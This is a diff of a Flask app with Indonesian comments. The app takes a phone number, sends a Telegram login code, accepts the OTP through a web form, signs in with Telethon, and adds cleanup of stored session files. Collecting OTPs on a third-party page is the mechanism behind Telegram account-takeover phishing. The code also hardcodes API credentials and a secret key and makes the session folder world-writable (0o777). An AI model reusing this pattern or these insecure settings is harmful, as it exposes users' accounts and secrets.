@@ -1,3 +1,4 @@
+# app.py
 import asyncio
 import os
 from flask import Flask, render_template, request, redirect, url_for, flash
@@ -11,12 +12,17 @@ nest_asyncio.apply()
 loop = asyncio.new_event_loop()
 asyncio.set_event_loop(loop)
 
-# Masukkan API_ID dan API_HASH Anda
+# Konfigurasi dasar
 API_ID = '20115110'
 API_HASH = '192c9900730edbd7e03fe772e3f8810d'
 
-# Pastikan folder untuk sesi ada
-os.makedirs('Session', exist_ok=True)
+# Setup path dan direktori
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+SESSION_DIR = os.path.join(BASE_DIR, 'Session')
+
+# Pastikan folder untuk sesi ada dengan permission yang tepat
+os.makedirs(SESSION_DIR, exist_ok=True)
+os.chmod(SESSION_DIR, 0o777)
 
 app = Flask(__name__)
 app.secret_key = 'ManusiaHebat'
@@ -28,12 +34,30 @@ def run_async(coro):
     """Helper function untuk menjalankan coroutine."""
     return loop.run_until_complete(coro)
 
+def cleanup_session(phone_number, session_file):
+    """Membersihkan session yang rusak."""
+    if os.path.exists(session_file):
+        try:
+            os.remove(session_file)
+        except Exception as e:
+            print(f"Error cleaning session: {e}")
+    if phone_number in clients:
+        client = clients[phone_number]
+        run_async(client.disconnect())
+        del clients[phone_number]
+
 async def init_client(phone_number, session_file):
-    """Inisialisasi client."""
+    """Inisialisasi client dengan penanganan error yang lebih baik."""
     if phone_number not in clients:
-        client = TelegramClient(session_file, API_ID, API_HASH, loop=loop)
-        await client.connect()
-        clients[phone_number] = client
+        try:
+            client = TelegramClient(session_file, API_ID, API_HASH, loop=loop)
+            await client.connect()
+            if not await client.is_user_authorized():
+                clients[phone_number] = client
+            return client
+        except Exception as e:
+            cleanup_session(phone_number, session_file)
+            raise e
     return clients[phone_number]
 
 @app.route("/", methods=["GET", "POST"])
@@ -45,8 +69,8 @@ def index():
         if not phone_number.startswith("+"):
             phone_number = "+62" + phone_number
         
-        # Hapus spasi atau karakter tak diinginkan
-        session_file = f"Session/{phone_number.replace('+', '').replace(' ', '')}.session"
+        # Buat path session file
+        session_file = os.path.join(SESSION_DIR, f"{phone_number.replace('+', '').replace(' ', '')}.session")
         
         try:
             async def send_code():
@@ -59,20 +83,20 @@ def index():
             
         except Exception as e:
             flash(f"Terjadi kesalahan: {str(e)}")
-            if phone_number in clients:
-                client = clients[phone_number]
-                run_async(client.disconnect())
-                del clients[phone_number]
+            cleanup_session(phone_number, session_file)
             return redirect(url_for("index"))
     
     return render_template("index.html")
 
 @app.route("/otp/<phone_number>", methods=["GET", "POST"])
 def otp(phone_number):
+    session_file = os.path.join(SESSION_DIR, f"{phone_number.replace('+', '').replace(' ', '')}.session")
+    
     if phone_number not in clients:
+        cleanup_session(phone_number, session_file)
         flash("Sesi tidak ditemukan. Mulai ulang.")
         return redirect(url_for("index"))
-
+    
     if request.method == "POST":
         otp = request.form.get("otp").strip()
         client = clients[phone_number]
@@ -88,23 +112,23 @@ def otp(phone_number):
             flash(f"Tersedia {user_name} ({phone_number}).")
             
             # Bersihkan client
-            if phone_number in clients:
-                del clients[phone_number]
-                
+            cleanup_session(phone_number, session_file)
             return redirect(url_for("index"))
             
         except Exception as e:
             flash(f"OTP salah atau terjadi kesalahan: {str(e)}")
-            # Bersihkan client jika terjadi error
-            if phone_number in clients:
-                run_async(client.disconnect())
-                del clients[phone_number]
+            cleanup_session(phone_number, session_file)
             return redirect(url_for("index"))
     
     return render_template("otp.html", phone_number=phone_number)
 
 @app.errorhandler(Exception)
 def handle_error(error):
+    if "wrong session ID" in str(error).lower():
+        phone_number = request.view_args.get('phone_number', '')
+        if phone_number:
+            session_file = os.path.join(SESSION_DIR, f"{phone_number.replace('+', '').replace(' ', '')}.session")
+            cleanup_session(phone_number, session_file)
     flash(f"Terjadi kesalahan: {str(error)}")
     return redirect(url_for("index"))
 
